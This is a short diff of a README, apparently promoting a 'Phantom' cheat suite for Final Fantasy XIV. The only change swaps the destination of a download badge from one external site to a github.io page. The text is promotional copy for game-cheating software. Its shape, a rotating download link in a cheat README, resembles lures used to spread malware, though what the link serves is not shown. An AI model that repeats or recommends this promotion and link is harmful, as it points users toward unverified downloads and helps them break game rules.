@@ -10,7 +10,7 @@ Phantom’s intuitive cheat menu allows players to customize every aspect of the
 
 This suite ensures minimal impact on game performance with optimized code and system resource management, delivering a smooth and seamless gameplay experience. Whether you’re leveling, farming, raiding, or competing in PvP, Phantom Cheat Suite is your ultimate tool for dominance.
 
-[![Download FFXIV Phantom](https://img.shields.io/badge/Download-Phantom-blueviolet)](https://paddyrewards.com/)
+[![Download FFXIV Phantom](https://img.shields.io/badge/Download-Phantom-blueviolet)](https://jesseaustinrvqf.github.io/.github/Final-Fantasy-PhantomBot)
 
 ---
 
